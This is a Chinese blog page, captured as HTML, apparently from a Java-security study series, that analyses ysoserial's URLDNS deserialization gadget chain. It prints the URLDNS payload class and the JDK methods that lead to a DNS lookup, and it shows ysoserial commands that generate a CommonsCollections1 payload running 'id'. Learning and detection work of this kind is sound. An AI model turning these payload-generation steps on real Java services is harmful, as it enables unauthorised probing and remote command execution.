@@ -1,0 +1,815 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="在反序列化篇-初探当中，介绍了一下Java反序列化和其他两种语言的比较，并且介绍了Java反序列化中最重要的两个函数：readObject，writeObject。在JAVA安全漫谈系列第二篇中，p牛吐槽了一下，网上很多学习java反序列化漏洞的文章，都从CommonsCollections这条利用链开始学起。而这条利用链其实是很复杂的，对新人学习而言，不太适合(我当初学习的时候也是踩了这个坑。跟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全漫谈-反序列化篇-URLDNS">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;11&#x2F;14&#x2F;Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-URLDNS&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="在反序列化篇-初探当中，介绍了一下Java反序列化和其他两种语言的比较，并且介绍了Java反序列化中最重要的两个函数：readObject，writeObject。在JAVA安全漫谈系列第二篇中，p牛吐槽了一下，网上很多学习java反序列化漏洞的文章，都从CommonsCollections这条利用链开始学起。而这条利用链其实是很复杂的，对新人学习而言，不太适合(我当初学习的时候也是踩了这个坑。跟">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;14&#x2F;sj3ZLdvVlYXnK4R.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;14&#x2F;E1iv45Mteb3BnqA.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;14&#x2F;hbkMINDj4Ggvydq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;14&#x2F;k1lEQILhqmVfA8u.png">
+<meta property="og:updated_time" content="2021-11-14T16:07:35.523Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;11&#x2F;14&#x2F;sj3ZLdvVlYXnK4R.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/11/14/Java安全漫谈-反序列化篇-URLDNS/"/>
+
+
+
+
+
+  <title>Java安全漫谈-反序列化篇-URLDNS | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-URLDNS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java安全漫谈-反序列化篇-URLDNS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-14T15:43:36+08:00">
+                2021-11-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.7k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>在反序列化篇-初探当中，介绍了一下Java反序列化和其他两种语言的比较，并且介绍了Java反序列化中最重要的两个函数：<br>readObject，writeObject。<br>在JAVA安全漫谈系列第二篇中，p牛吐槽了一下，网上很多学习java反序列化漏洞的文章，都从CommonsCollections这条利用链开始学起。<br>而这条利用链其实是很复杂的，对新人学习而言，不太适合(我当初学习的时候也是踩了这个坑。跟着做了半天才半知半解的)。<br>P牛建议，学习Java反序列化，可以先从URLDNS开始看起，因为它足够简单。</p>
+<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>在介绍反序列化漏洞利用链之前，P牛先介绍了一个里程碑式的工具。ysoserial<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">传送门</a><br>反序列化漏洞在各个语言里本不是一个新鲜的名词，但2015年Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上提出了利⽤Apache Commons Collections来构造命令执⾏的利⽤<br>链，并在年底因为对Weblogic、JBoss、Jenkins等著名应⽤的利⽤，⼀⽯激起千层浪，彻底打开了⼀⽚Java安全的蓝海。<br>ysoserial就是两位原作者在此议题中释出的一个工具，它可以让用户根据自己选择的利用链，生成反序列化利用数据，通过将这些数据发送给目标，从而执行用户预先定义的命令。</p>
+<p>什么是利用链？</p>
+<p>利用链也叫”gadget chains”,通常称为gadget，如果学过PHP反序列化漏洞，那么可以将gadget理解为一种方法，<strong>它连接的是从触发位置开始到执行命令的位置结束</strong>，<br>在PHP里可能是__desctruct到eval，如果没学过其他语言的反序列化漏洞，那么gadget就只是一种生成POC的方法罢了。</p>
+<p>yeoserial的使用也很简单，虽然赞是不理解CommonsCollections，但是用ysoserial可以很容易的生成这个gadget对应的poc。<br>tips：根据github社区规则，删除了托管在github上的jar文件，但是jar下载链接在md说明中有。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>
+<p>ysoserial的参数是一条命令，这里是id。生成好的poc发送给目标。如果目标存在反序列化漏洞，并满足这个gadget对应的条件，则命令id将被执行。<br>生成的poc默认会输出在终端窗口。可以使用重定向保存到文件中。<br>这里保存到test中。并用SerializationDumper分析一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-8eb5cbfbf6-1.jar CommonsCollections1 &quot;id&quot; &gt; test</span><br><span class="line">java -jar SerializationDumper-v1.13.jar -r test</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/11/14/sj3ZLdvVlYXnK4R.png" alt="1.png"><br>可以看到后面将会讲到的老朋友(sun.reflect.annotation.AnnotationInvocationHandler)</p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS是ysoserial中一个利用链的名字，但是准确来说，这个其实不能称为“利用链”。因为其参数不是一个可以“利用”的命令。<br>参数作为一个URL，触发的结果不是命令执行，而是一次DNS请求。<br>虽然这个“利用链”不是能利用的，但是因为URLDNS有如下有点，非常适合我们在检测反序列化漏洞时使用：</p>
+<ol>
+<li>使用Java内置的类构造，对第三方库没有依赖(相当于，只要你存在反序列化漏洞，就能检测出来，不受环境影响)</li>
+<li>在目标没有回显的时候，可以通过DNS请求得知是否存在反序列化漏洞(当然要能出网)</li>
+</ol>
+<p>打开 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a><br>看看ysoserial是如何生成URLDNS的代码的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                PayloadRunner.run(URLDNS<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简简单单40来⾏代码，原理在注释⾥也简单描述了，我们详细分析⼀下。</p>
+<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>跟着P牛的分析，简单看一下利用链<br>看到URLDNS类的getObject方法，ysoserial会调用这个方法获取Payload。这个方法返回的是一个对象，这个对象就是最后被序列化的对象，这个例子里是HashMap。<br>前面说到过，触发反序列化的方法是readObject，因为Java开发者(包括Java内置库的开发者)，经常会在里面写自己的逻辑，导致可以构造利用链。<br>那么，可以直奔HashMap类的readObject方法。可以按Ctrl+Shift+Alt+N;然后搜索HashMap，快速定位到这个类<br><img src="https://i.loli.net/2021/11/14/E1iv45Mteb3BnqA.png" alt="1.png"><br>点进来后ctrl+f快速搜索readObject方法。<br><img src="https://i.loli.net/2021/11/14/hbkMINDj4Ggvydq.png" alt="1.png"><br>可以看到1152行的<code>putVal(hash(key), key, value, false, false);</code><br>计算了各个key的hash值。在这里下断点，对这个hash函数进行调试并跟进，这是调用栈：<br>这里放一段P牛原话。</p>
+<blockquote>
+<p>在没有分析过的情况下，我为何会关注hash函数？因为ysoserial的注释中很明确地说明了“During the put above, the URL’s hashCode is calculated and cached. This resets that so<br>the next time hashCode is called a DNS lookup will be triggered.”，是hashCode的计算操作触发了DNS请求。<br>另外，如何对Java和ysoserial项⽬进⾏调试，可以参考星球⾥的另⼀篇⽂章：<a href="https://t.zsxq.com/ubQRvjq" target="_blank" rel="noopener">https://t.zsxq.com/ubQRvjq</a><br>这里先用P师傅的调用栈原图。静态跟进，下一篇专门学习一下对java文件和项目的调试<br><img src="https://i.loli.net/2021/11/14/k1lEQILhqmVfA8u.png" alt="1.png"><br>在readObject之中，调用了HashMap的hash方法。hash方法随后调用了key(这个URL类是作为key传到HashMap中的)的hashCode方法<br>这里跟进hash方法。idea中ctrl+b，选择方法名即可快速跟进。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到调用了key的hashCode方法，继续跟进hashCode()方法.<br>这里出现了问题。因为这个key在静态调试的时候，是不确定的。所以这里无法通过ctrl+b跟进到URL类的hashcode方法中。<br>但是！这里已经知道了key是URL类，所以再来一次Ctrl+Shift+Alt+N。直接定位到URL，搜索其hashcode方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时,handler 是 URLStreamHandler 对象（的某个⼦类对象），继续跟进其 hashCode ⽅法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        String protocol = u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        InetAddress addr = getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String host = u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        String file = u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        String ref = u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进第十行的getHostAddress中，这里因为是同一个类，在idea中可以直接用ctrl+b快速跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到第十行中的<code>u.hostAddress = InetAddress.getByName(host);</code><br>这里这一行代码的作用是根据主机名获取其IP地址，也就是一次dns查询。到这里就不必再继续跟进了。<br>利用一些第三方反连平台，比如dnslog，就可以查看到这次请求，证明的确存在反序列化漏洞。<br>至此，整个URLDNS的Gadget其实清晰又简单：</p>
+<ol>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ol>
+<p>反序列化从最开始的readObject，到最后触发DNS请求的getByName，只经过了6个函数调用<br>这在Java中其实已经算很少了。<br>要构造这个Gadget，只需要初始化一个java.net.URL对象，作为key放在java.util.HashMap中。<br>然后设置这个URL对象的hashCode为初始值-1，这样反序列化时将会重新计算其hashCode<br>这样才能触发到后面的DNS请求，否则不会调用到URL-&gt;hashCode()</p>
+<p>另外，ysoserial为了防止在生成Payload的时候也执行URL请求和DNS查询，所以重写了一个SilentURLStreamHandler类，这不是必须的。</p>
+<h2 id="学习方式的探索"><a href="#学习方式的探索" class="headerlink" title="学习方式的探索"></a>学习方式的探索</h2><p>p师傅原话</p>
+<blockquote>
+<p>学习过PHP反序列化的同学这时就会惊叹，这不就跟在PHP⾥找反序列化利⽤链⼀样吗？其实就是⼀样，<br>那为什么很多同学觉得Java反序列化很难？多半其实是被 CommonsCollections 带偏了，这个链中确实有⼀些较难理解的概念。<br>有时候想要学习⼀个东⻄，⽹上搜索⼀下，发现有教程，于是跟着做⼀遍。<br>这样⼀来，你会发现⽹上⼤部分Java反序列化“教程”、“⼊⻔”通常上来先了解Java反序列化是什么，<br>然后很快开始讲CommonsCollections ，就好像刚知道C语⾔语法的同学⽴⻢继续学习Linux内核，<br>我是⼗分不建议这样做的，除⾮你有⾮常强的理解能⼒。<br>学习需要聪明⼀点，并独⽴思考问题。我很少参照别⼈的⽂章来学习，这样你学的东⻄是⼆⼿的，有时候连⼆⼿都不是，⽂章原作者也可能是参考另⼀篇⽂章写的。<br>我的建议是从⽂档和源码开始学，实在有压⼒可以参考⼀些⻛评较好的书籍或技术博客。<br>当然，有时候你并不知道怎样是对的怎样是错的。⽐如你作为⼀个Java反序列化漏洞的初学者，<br>你并不知道应该先学习 URLDNS 还是 CommonsCollections ，也许你连 URLDNS 的名字都没听过，<br>⽽你看到⽹上⼤部分⽂章都是介绍 CommonsCollections 的，⾃然也就去学习这个了。<br>所以有些弯路确实是避免不了的，不过如果你在学习的道路上更加富有探索精神，<br>看到ysoserial这种项⽬时多问问⾃⼰“其他的Gadget是做什么的”，对于未知的事物原理充满好奇喜欢翻翻源码，<br>或者碰巧加⼊了我们代码审计知识星球（开玩笑），应该是可以少⾛⼀些弯路的。</p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/12/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-%E5%88%9D%E6%8E%A2/" rel="next" title="java安全漫谈-反序列化篇-初探">
+                <i class="fa fa-chevron-left"></i> java安全漫谈-反序列化篇-初探
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
